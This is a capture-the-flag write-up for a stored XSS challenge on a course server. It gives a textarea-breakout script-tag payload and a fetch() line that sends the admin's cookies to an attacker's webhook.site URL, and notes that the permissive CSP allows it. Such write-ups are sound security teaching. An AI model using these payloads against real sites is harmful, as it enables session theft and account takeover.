# Challenge `Read my lips: No more scripts!` writeup

- Vulnerability: XSS
- Where: `http://mustard.stt.rnl.tecnico.ulisboa.pt:22254` new blogpost content box
- Impact: Allows an attacker to inject malicious code in the webpage

## Steps to reproduce

1. Get a URL in [Webhook](https://webhook.site/) to collect your http requests
2. Host a file online containing the script `fetch("`_`<your_webhook_url>`_`?cookie="+document.cookie)`
3. Write a random unused title in the 'Title' box and write something (whatever) in the 'Content' box, and click `Create Post`, you'll be redirected to a new page to update the blogpost
4. Write the script `</textarea><script src="`_`<script_file_url>`_`"></script>` in the 'Content' box and click `Update post and send it for admin review`
5. The admin will load the script from the link and execute it, sending a http request to your Webhook URL with his cookies

__Notes:__
- This method works because the Content Security Policy directive `script-src *` allows to load scripts from any source
- In step 4, `</textarea>` is needed to close the tag, so that the following script is not interpreted as text, but rather as code that will be executed

[(POC)](pocs/read_my_lips_no_more_scripts_poc.py)
